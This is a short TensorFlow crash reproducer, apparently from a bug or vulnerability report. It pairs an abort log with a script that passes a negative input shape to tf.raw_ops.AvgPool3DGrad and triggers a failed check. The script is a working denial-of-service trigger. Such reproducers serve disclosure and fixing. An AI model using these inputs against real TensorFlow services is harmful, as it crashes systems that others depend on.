# Signal -6;2022-03-26 16:54:06.017725: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  SSE3 SSE4.1 SSE4.2 AVX AVX2 AVX512F FMATo enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.2022-03-26 16:54:06.021306: F tensorflow/core/framework/tensor_shape.cc:397] Check failed: size >= 0 (-536870912 vs. 0)

# AvgPooling3dGradOp

import tensorflow as tf

ksize = [1, 1, 1, 1, 1]
strides = [1, 1, 1, 1, 1]
padding = "VALID"
data_format = "NDHWC"
orig_input_shape = tf.constant(-536870912, shape=[5], dtype=tf.int32)
grad = tf.constant(100, shape=[1,3,5,4,1], dtype=tf.float32)
tf.raw_ops.AvgPool3DGrad(orig_input_shape=orig_input_shape, grad=grad, ksize=ksize, strides=strides, padding=padding, data_format=data_format)